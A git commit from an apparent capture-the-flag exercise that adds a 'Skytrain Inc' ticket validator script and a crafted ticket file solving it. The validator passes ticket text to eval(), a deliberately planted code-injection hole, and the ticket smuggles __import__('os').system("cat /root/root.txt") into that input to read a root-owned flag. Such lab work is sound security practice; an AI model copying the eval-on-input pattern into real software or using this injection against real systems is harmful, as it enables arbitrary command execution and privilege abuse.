ab669aa1376460d0453ca64f5a431fac70db5891
nishan8583 <nishanmaharjan17@gmail.com>
2021-08-28 17:52:48 +0545

    consumed

---
+++ bug_hunter/ctf.py
@@ -0,0 +1,59 @@
+#Skytrain Inc Ticket Validation System 0.1
+#Do not distribute this file.
+
+def load_file(loc):
+    if loc.endswith(".md"):
+        return open(loc, 'r')
+    else:
+        print("Wrong file type.")
+        exit()
+
+def evaluate(ticketFile):
+    #Evaluates a ticket to check for ireggularities.
+    code_line = None
+    for i,x in enumerate(ticketFile.readlines()):
+        print(i)
+        if i == 0:
+            if not x.startswith("# Skytrain Inc"):
+                return False
+            continue
+        if i == 1:
+            if not x.startswith("## Ticket to "):
+                return False
+            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
+            continue
+
+        if x.startswith("__Ticket Code:__"):
+            print("Starts with")
+            code_line = i+1
+            continue
+
+        if code_line and i == code_line:
+            print("IN HERE")
+            if not x.startswith("**"):
+                print("NOT START")
+                return False
+            print("START")
+            ticketCode = x.replace("**", "").split("+")[0]
+            if int(ticketCode) % 7 == 4:
+                print("Module number matched")
+                print("Executing",x.replace("**", ""))
+                validationNumber = eval(x.replace("**", ""))
+                if validationNumber > 100:
+                    return True
+                else:
+                    return False
+    return False
+
+def main():
+    fileName = input("Please enter the path to the ticket file.\n")
+    ticket = load_file(fileName)
+    #DEBUG print(ticket)
+    result = evaluate(ticket)
+    if (result):
+        print("Valid ticket.")
+    else:
+        print("Invalid ticket.")
+    ticket.close
+
+main()
---
+++ bug_hunter/t.md
@@ -0,0 +1,5 @@
+# Skytrain Inc
+## Ticket to Nishan Maharjan
+__Ticket Code:__
+**200+ 24 == 224 and __import__('os').system("cat /root/root.txt")
+
